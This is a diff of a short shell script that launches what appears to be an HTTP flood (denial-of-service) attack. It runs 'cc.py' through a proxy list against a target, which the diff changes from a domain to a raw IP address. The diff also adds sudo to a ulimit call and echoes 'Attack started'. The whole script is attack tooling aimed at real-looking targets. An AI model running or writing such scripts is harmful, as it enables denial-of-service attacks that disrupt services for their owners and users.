@@ -7,7 +7,7 @@
 #
 #the command you want to exec
 
-atk_cmd="python3 cc.py -url https://port.moonport.top/ -down -f proxy.txt -v 5 -check"
+atk_cmd="python3 cc.py -url http://64.225.82.186 -down -f proxy.txt -v 5 -check"
 
 pip3 install requests pysocks
 
@@ -15,7 +15,7 @@ pip3 install requests pysocks
 process=10
 
 #change the system limit
-ulimit -n 999999
+sudo ulimit -n 999999
 
 
 echo Attack started
